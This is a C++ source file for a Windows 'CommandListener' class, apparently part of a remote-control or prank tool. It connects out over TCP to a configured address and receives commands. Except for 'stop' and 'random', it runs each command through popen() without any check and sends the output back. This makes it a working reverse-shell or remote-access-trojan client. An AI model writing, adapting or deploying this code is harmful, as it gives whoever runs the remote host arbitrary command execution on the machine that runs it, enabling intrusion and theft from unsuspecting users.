#include <string.h>
#include "CommandListener.h"
#include "RandomMouse.h"

using namespace std;

CommandListener::CommandListener()
{
  setupSocket();
}

CommandListener::~CommandListener()
{

}

void CommandListener::startListening()
{
  connect(sConnect, (SOCKADDR*)&addr, sizeof(addr));
  while (1) {
    ZeroMemory(message, 200);
    r = recv(sConnect, message, sizeof(message), 0);
    cout << message << endl;
    handleCommand(message);
  }
  closesocket(sConnect);

  getchar();
}

void CommandListener::setupSocket()
{
  //Winsock-DLL
  WSAData wsaData;
  WORD DLLVersion;
  DLLVersion = MAKEWORD(2,1);
  r = WSAStartup(DLLVersion, &wsaData);
  // Socket configuration
  sConnect = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  addr.sin_addr.s_addr = inet_addr(IP_ADDR);
  addr.sin_family = AF_INET;
  addr.sin_port = htons(PORT_NUM);
}

void CommandListener::handleCommand(const char* cmd)
{
  // 大哥這不是python, 字串比較要用function
  // git blame yoyopig
  if(strcmp(cmd, "stop") == 0)
  {
    StopAllThreads sat;
    sat();
  }
  else if(strcmp(cmd, "random") == 0)
  {
    // RandomMouse rdm;
    // this->tp.setThread(&rdm);
  }
  else
  {
    string str = executeCommand(message);
    char *sendbuf = &str[0];
    send(sConnect,sendbuf,(int)strlen(sendbuf),0);
    char done[30] = "Command executed.\n";
    send(sConnect,done,(int)strlen(done),0);
  }
  
}

string CommandListener::executeCommand(const char* cmd)
{
  array<char, 128> buffer;
  string result;
  unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
  if (!pipe) {
    throw runtime_error("popen() failed!");
  }
  while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
    result += buffer.data();
  }
  return result;
}